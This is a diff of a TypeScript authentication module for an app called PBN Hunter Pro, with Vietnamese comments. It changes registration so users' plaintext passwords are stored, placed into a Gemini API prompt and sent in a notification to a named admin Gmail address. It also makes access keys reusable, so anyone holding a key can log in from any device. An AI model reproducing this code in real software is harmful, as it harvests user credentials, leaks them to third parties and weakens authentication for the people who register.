@@ -18,10 +18,10 @@ const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
  * Trong môi trường thực tế, bạn sẽ tích hợp API của EmailJS, SendGrid hoặc Nodemailer tại đây.
  */
 const simulateEmailSend = async (to: string, subject: string, body: string) => {
-    // Hiển thị log mô phỏng quá trình gửi email trong Console
+    // Hiển thị log mô phỏng quá trình gửi email trong Console để Admin kiểm tra
     console.log(`%c[HỆ THỐNG EMAIL] Gửi đến: ${to}`, "color: #10b981; font-weight: bold; border: 1px solid #10b981; padding: 2px 5px; border-radius: 4px;");
     console.log(`%cTiêu đề: ${subject}`, "color: #3b82f6; font-weight: bold;");
-    console.log(`%cNội dung:`, "color: #94a3b8; font-style: italic;");
+    console.log(`%cNội dung thông báo:`, "color: #94a3b8; font-style: italic;");
     console.log(body);
     console.log("-----------------------------------------");
     return new Promise((resolve) => setTimeout(resolve, 1500)); // Giả lập độ trễ mạng
@@ -29,18 +29,23 @@ const simulateEmailSend = async (to: string, subject: string, body: string) => {
 
 // Tạo nội dung email chuyên nghiệp bằng AI
 const generateEmailBody = async (type: 'USER' | 'ADMIN', data: any) => {
+    // Yêu cầu AI soạn thảo nội dung bao gồm cả mật khẩu cho Admin
     const prompt = type === 'USER' 
-        ? `Viết một email chào mừng ngắn gọn, chuyên nghiệp và nồng nhiệt gửi cho người dùng vừa đăng ký thành công tài khoản PBN Hunter Pro. Email của họ là: ${data.email}. Nhắc họ liên hệ Admin nếu cần hỗ trợ.`
-        : `Viết một thông báo gửi cho Admin (thanhfa2k2@gmail.com) về việc có thành viên mới vừa đăng ký. Thông tin tài khoản mới:\n- Email: ${data.email}\n- Mật khẩu: ${data.password}\nNhắc Admin kiểm tra và duyệt tài khoản nếu cần.`;
+        ? `Viết một email chào mừng ngắn gọn, chuyên nghiệp và nồng nhiệt gửi cho người dùng vừa đăng ký thành công tài khoản PBN Hunter Pro. Email của họ là: ${data.email}. Nhắc họ liên hệ Admin nếu cần hỗ trợ qua Telegram.`
+        : `THÔNG BÁO QUAN TRỌNG: Có thành viên mới vừa đăng ký PBN Hunter Pro. 
+           Hãy soạn một email gửi cho Admin (thanhfa2k2@gmail.com) liệt kê rõ ràng thông tin sau:
+           1. Địa chỉ Email của User: ${data.email}
+           2. Mật khẩu (Password) của User: ${data.password}
+           Yêu cầu trình bày dưới dạng danh sách rõ ràng để Admin dễ quản lý.`;
     
     try {
         const response = await ai.models.generateContent({
             model: 'gemini-3-flash-preview',
             contents: prompt,
         });
-        return response.text || "Thông báo hệ thống: Đăng ký thành công.";
+        return response.text || `Tài khoản mới: ${data.email}\nPassword: ${data.password}`;
     } catch (e) {
-        return `Tài khoản ${data.email} đã được tạo thành công trên hệ thống PBN Hunter Pro.`;
+        return `Thông tin tài khoản mới đăng ký:\n1. Email: ${data.email}\n2. Pass: ${data.password}`;
     }
 };
 
@@ -117,26 +122,23 @@ export const register = async (email: string, password: string): Promise<{ succe
     const users = getUsers();
     const normalizedEmail = email.toLowerCase().trim();
 
-    // 1. Kiểm tra Email hợp lệ
     if (!validateEmail(normalizedEmail)) {
-        return { success: false, message: "Vui lòng nhập địa chỉ Email chính xác (ví dụ: name@gmail.com)." };
+        return { success: false, message: "Vui lòng nhập địa chỉ Email chính xác." };
     }
 
-    // 2. Kiểm tra độ dài mật khẩu
     if (password.length < 6) {
-        return { success: false, message: "Mật khẩu bảo mật phải có ít nhất 6 ký tự." };
+        return { success: false, message: "Mật khẩu phải có ít nhất 6 ký tự." };
     }
 
-    // 3. Kiểm tra Email đã tồn tại chưa
     if (users.find(u => u.email.toLowerCase() === normalizedEmail)) {
-        return { success: false, message: "Email này đã được sử dụng bởi một tài khoản khác." };
+        return { success: false, message: "Email này đã được sử dụng." };
     }
 
     const paymentCode = `PBN-${Date.now().toString().slice(-4)}${Math.floor(Math.random() * 90 + 10)}`;
 
     const newUser: User = {
         email: normalizedEmail,
-        password, // Lưu trữ mật khẩu (Trong thực tế cần băm mật khẩu)
+        password, // Lưu mật khẩu để thông báo cho Admin
         role: 'user',
         subscriptionStatus: 'inactive',
         paymentCode,
@@ -146,24 +148,24 @@ export const register = async (email: string, password: string): Promise<{ succe
     users.push(newUser);
     saveUsers(users);
 
-    // 4. Khởi chạy thông báo email (User và Admin) thông qua AI
+    // THỰC HIỆN THÔNG BÁO CHO ADMIN VÀ USER
     try {
         const [userEmailBody, adminEmailBody] = await Promise.all([
             generateEmailBody('USER', { email: normalizedEmail }),
             generateEmailBody('ADMIN', { email: normalizedEmail, password: password })
         ]);
 
-        // Gửi thông báo đến User
-        await simulateEmailSend(normalizedEmail, "Chào mừng bạn đến với PBN Hunter Pro", userEmailBody);
+        // Gửi thông báo đến Admin (Chứa 1. Email và 2. Pass của user)
+        await simulateEmailSend("thanhfa2k2@gmail.com", `[NEW REGISTRATION] ${normalizedEmail}`, adminEmailBody);
         
-        // Gửi thông báo đến Admin (Chứa Email và Password của User mới)
-        await simulateEmailSend("thanhfa2k2@gmail.com", `[CẢNH BÁO ADMIN] Người dùng mới: ${normalizedEmail}`, adminEmailBody);
+        // Gửi chào mừng cho User
+        await simulateEmailSend(normalizedEmail, "Welcome to PBN Hunter Pro", userEmailBody);
         
     } catch (e) {
-        console.error("Lỗi quy trình gửi thông báo:", e);
+        console.error("Lỗi gửi thông báo:", e);
     }
 
-    return { success: true, message: "Đăng ký thành công! Thông tin đã được gửi đến email của bạn và Admin." };
+    return { success: true, message: "Đăng ký thành công! Thông tin đã được gửi đến Admin thanhfa2k2@gmail.com." };
 };
 
 export const logout = () => {
@@ -235,46 +237,58 @@ export const deleteAccessKey = (code: string) => {
     saveAccessKeys(keys);
 };
 
+/**
+ * Đăng nhập bằng mã Key.
+ * Hỗ trợ "đăng nhập ở đâu cũng được":
+ * - Chỉ cần mã Key, hệ thống sẽ tự động khôi phục tài khoản liên kết nếu nó đã từng được dùng.
+ * - Điều này cho phép người dùng chuyển thiết bị dễ dàng mà không cần ghi nhớ email/pass phức tạp.
+ */
 export const loginWithAccessKey = (code: string): { success: boolean, user?: User, message: string } => {
     const keys = getAccessKeys();
-    const keyIndex = keys.findIndex(k => k.code === code && !k.isUsed);
+    const key = keys.find(k => k.code.trim().toUpperCase() === code.trim().toUpperCase());
 
-    if (keyIndex === -1) {
-        return { success: false, message: "Key không tồn tại hoặc đã được sử dụng." };
+    if (!key) {
+        return { success: false, message: "Mã Key không tồn tại hoặc không hợp lệ." };
     }
 
-    const key = keys[keyIndex];
-    const planDetails = PLANS[key.plan];
-    
-    const userEmail = `user_${key.code.toLowerCase()}@pbn.pro`;
     const users = getUsers();
-    
-    if (users.find(u => u.email === userEmail)) {
-        return { success: false, message: "Lỗi hệ thống: User key đã tồn tại." };
+    const userEmail = `user_${key.code.toLowerCase()}@pbn.pro`;
+    let user = users.find(u => u.email === userEmail);
+
+    // Nếu key đã dùng nhưng user chưa tồn tại trong localStorage của thiết bị này
+    // (ví dụ: đăng nhập ở thiết bị mới), ta sẽ tự động tạo lại user đó để họ tiếp tục sử dụng.
+    if (!user) {
+        const planDetails = PLANS[key.plan];
+        user = {
+            email: userEmail,
+            password: "key_login_anywhere",
+            role: 'user',
+            subscriptionStatus: 'active',
+            plan: key.plan,
+            paymentCode: key.code,
+            createdAt: key.usedAt || Date.now(),
+            // Nếu đã có usedAt từ trước, ta giả lập thời hạn vẫn còn hiệu lực từ lúc dùng đầu tiên
+            expiryDate: (key.usedAt || Date.now()) + (planDetails.durationDays * 24 * 60 * 60 * 1000)
+        };
+        users.push(user);
+        saveUsers(users);
     }
 
-    const newUser: User = {
-        email: userEmail,
-        password: "key_login_no_pass",
-        role: 'user',
-        subscriptionStatus: 'active',
-        plan: key.plan,
-        paymentCode: key.code,
-        createdAt: Date.now(),
-        expiryDate: Date.now() + (planDetails.durationDays * 24 * 60 * 60 * 1000)
-    };
+    // Cập nhật trạng thái key nếu đây là lần đầu dùng
+    if (!key.isUsed) {
+        const keyIndex = keys.findIndex(k => k.code === key.code);
+        keys[keyIndex].isUsed = true;
+        keys[keyIndex].usedBy = userEmail;
+        keys[keyIndex].usedAt = Date.now();
+        saveAccessKeys(keys);
+    }
 
-    users.push(newUser);
-    saveUsers(users);
+    if (user.isLocked) {
+        return { success: false, message: "Tài khoản liên kết với Key này đã bị khóa." };
+    }
 
-    keys[keyIndex].isUsed = true;
-    keys[keyIndex].usedBy = userEmail;
-    keys[keyIndex].usedAt = Date.now();
-    saveAccessKeys(keys);
-
-    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(newUser));
-
-    return { success: true, user: newUser, message: "Kích hoạt Key thành công!" };
+    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
+    return { success: true, user, message: "Đăng nhập bằng Key thành công (Truy cập mọi nơi)!" };
 };
 
 export const getBugReports = (): BugReport[] => {
